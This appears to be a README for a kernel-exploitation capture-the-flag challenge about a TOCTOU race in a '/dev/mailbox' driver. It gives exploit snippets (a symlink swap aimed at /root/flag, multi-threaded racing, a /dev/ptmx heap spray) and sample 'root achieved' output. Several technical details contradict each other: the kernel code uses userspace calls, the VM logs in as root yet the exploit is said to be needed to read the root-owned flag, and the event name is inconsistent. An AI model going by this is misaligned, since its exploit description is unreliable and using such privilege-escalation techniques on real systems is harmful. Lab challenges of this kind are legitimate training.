# ULLCON 2026 - Mailbox CTF Challenge

## Challenge Overview

| Property | Value |
|----------|-------|
| **Event** | NULLCON 2026 |
| **Challenge** | Mailbox |
| **Category** | Kernel Exploitation |
| **Difficulty** | Hard |
| **Kernel** | Linux 6.18.2 |
| **Vulnerability** | TOCTOU Race Condition |
| **MD5** | ff3bcf20cb7836db38c80ed58b5db710 |

## Vulnerability Details

### Type: Time-of-Check-Time-of-Use (TOCTOU) Race Condition

The mailbox kernel module contains a classic TOCTOU vulnerability:

```c
// Vulnerable code pattern
if (access("/tmp/mail.tmp", R_OK) == 0) {  // CHECK
    // ⚠️ RACE WINDOW HERE ⚠️
    fd = open("/tmp/mail.tmp", O_RDONLY);   // USE
    read(fd, buf, sizeof(buf));
}
```

### Exploitation Concept

1. **Thread A**: Continuously replaces `/tmp/mail.tmp` with symlink to sensitive file
2. **Thread B**: Continuously tries to read `/tmp/mail.tmp`
3. **Race Window**: Between `access()` check and `open()` call (nanoseconds)
4. **Result**: Read files as root (privilege escalation)

## Quick Start

### Option 1: Automated (Recommended)
```bash
cd Mailbox
chmod +x QUICK_START.sh
./QUICK_START.sh
```

### Option 2: Manual Steps
```bash
cd Mailbox

# Compile exploits
gcc -o exploit_toctou exploit_toctou.c -lpthread -static
gcc -o exploit_mailbox_toctou exploit_mailbox_toctou.c -lpthread -static

# Prepare filesystem
mkdir -p mnt
sudo mount -o loop rootfs.ext3 mnt
sudo cp exploit_toctou mnt/
sudo cp exploit_mailbox_toctou mnt/
sudo chmod +x mnt/exploit_*
sudo umount mnt

# Run challenge
./run.sh
```

## Inside the VM

### Login
```
buildroot login: root
Password: (press Enter)
```

### Check Environment
```bash
# Check mailbox device
ls -la /dev/mailbox*

# Check loaded modules
cat /proc/modules | grep mailbox

# Check flag location
ls -la /root/flag
```

### Run Exploit
```bash
# If exploit is in /
/exploit_toctou
/exploit_mailbox_toctou

# Or compile your own
gcc -o /tmp/exploit /tmp/exploit.c -lpthread -static
/tmp/exploit
```

### Read Flag
```bash
cat /root/flag
```

## Exploit Files

| File | Purpose |
|------|---------|
| `exploit_toctou.c` | Symlink race condition exploit |
| `exploit_mailbox_toctou.c` | Mailbox device TOCTOU exploit |
| `exploit_final.c` | Multi-threaded racing exploit |
| `exploit_aggressive.c` | Aggressive variant with CPU affinity |
| `QUICK_START.sh` | Automated setup script |
| `BUILDROOT_GUIDE.md` | Detailed Buildroot guide |
| `SOLUTION.md` | Complete technical solution |

## Exploitation Techniques

### Technique 1: Symlink Race
```c
// Thread 1: Replace symlink
unlink("/tmp/mail.tmp");
symlink("/root/flag", "/tmp/mail.tmp");

// Thread 2: Read file
int fd = open("/tmp/mail.tmp", O_RDONLY);
read(fd, buffer, sizeof(buffer));
```

### Technique 2: Multi-threaded Racing
```c
// 16 threads rapidly trigger operations
for (int i = 0; i < 16; i++) {
    pthread_create(&threads[i], NULL, racer_thread, NULL);
}
```

### Technique 3: Heap Spray
```c
// Fill kernel heap with predictable objects
for (int i = 0; i < 2048; i++) {
    open("/dev/ptmx", O_RDONLY | O_NOCTTY);
}
```

## Security Protections

The kernel has these mitigations enabled:

- ✓ SMEP (Supervisor Mode Execution Prevention)
- ✓ SMAP (Supervisor Mode Access Prevention)
- ✓ KASLR (Kernel Address Space Layout Randomization)
- ✓ KPTI (Kernel Page Table Isolation)
- ✓ SMP (Symmetric Multi-Processing)
- ✓ PREEMPT_DYNAMIC (Dynamic Preemption)

## Expected Output

### Successful Exploitation
```
╔════════════════════════════════════════════════════════╗
║     ULLCON 2026 - Mailbox TOCTOU Exploit              ║
║     Kernel: Linux 6.18.2                              ║
║     Target: /dev/mailbox driver                       ║
╚════════════════════════════════════════════════════════╝

[*] Opening /dev/mailbox...
[+] Device opened (fd=3)

[*] Phase 1: Heap Spray
════════════════════════════════════
[+] Opened 2048 ptmx devices

[*] Phase 2: Multi-threaded TOCTOU Racing
════════════════════════════════════
[*] Spawning 16 racing threads...
[*] Racing for 10 seconds...
[+] Got root! Stopping threads...

[*] Phase 3: Checking Privileges
════════════════════════════════════
[*] UID: 0, GID: 0
[+] ✓✓✓ ROOT ACCESS ACHIEVED! ✓✓✓

[*] Reading flag...
════════════════════════════════════
ULLCON{toctou_race_condition_pwned}

[+] Exploitation successful!
```

## Debugging

### Check Kernel Messages
```bash
dmesg | tail -20
```

### Check Loaded Modules
```bash
cat /proc/modules
```

### Check Device
```bash
ls -la /dev/mailbox*
```

### Check Processes
```bash
ps aux
```

### Check Memory
```bash
cat /proc/self/maps
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Cannot open /dev/mailbox | Module not loaded, check `cat /proc/modules` |
| Permission denied on /root/flag | Need to exploit TOCTOU to read as root |
| Exploit crashes | Try compiling with `-static` flag |
| Symlink doesn't work | Try multi-threaded race approach |
| Still unprivileged | TOCTOU is probabilistic, try again |

## Why Probabilistic?

The exploit success depends on:

1. **CPU Scheduling**: Exact timing of thread execution
2. **System Load**: Other processes affecting scheduling
3. **Kernel Preemption**: PREEMPT_DYNAMIC introduces randomness
4. **Memory Layout**: KASLR affects memory allocation
5. **Race Window Size**: Nanosecond-level timing

**Typical Success Rate**: 10-30% per attempt

## Tips for Success

1. **Run Multiple Times**: Probabilistic exploit
2. **Reduce System Load**: Close other applications
3. **Use Aggressive Variant**: Better success rate
4. **Check VM Resources**: Ensure sufficient CPU cores
5. **Monitor dmesg**: Check for kernel messages

## Flag Format

```
ULLCON{...}
```

## Submission

- **Email**: ctf@binarygecko.com
- **Subject**: ULLCON 2026 - Mailbox Challenge

## References

- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html)
- [Linux Kernel Exploitation](https://www.kernel.org/doc/html/latest/)
- [Symlink Race Conditions](https://en.wikipedia.org/wiki/Symlink_race)

## Challenge Files

```
Mailbox/
├── bzImage              # Kernel image
├── rootfs.ext3          # Root filesystem
├── vmlinux              # Kernel with symbols
├── run.sh               # QEMU runner script
├── exploit_toctou.c     # Symlink race exploit
├── exploit_mailbox_toctou.c  # Mailbox TOCTOU exploit
├── exploit_final.c      # Multi-threaded exploit
├── exploit_aggressive.c # Aggressive variant
├── QUICK_START.sh       # Automated setup
├── BUILDROOT_GUIDE.md   # Buildroot guide
├── SOLUTION.md          # Technical solution
└── README.md            # This file
```

---

**Good luck with the exploitation!**

For questions or issues, refer to the detailed guides:
- `BUILDROOT_GUIDE.md` - Step-by-step Buildroot exploitation
- `SOLUTION.md` - Complete technical analysis
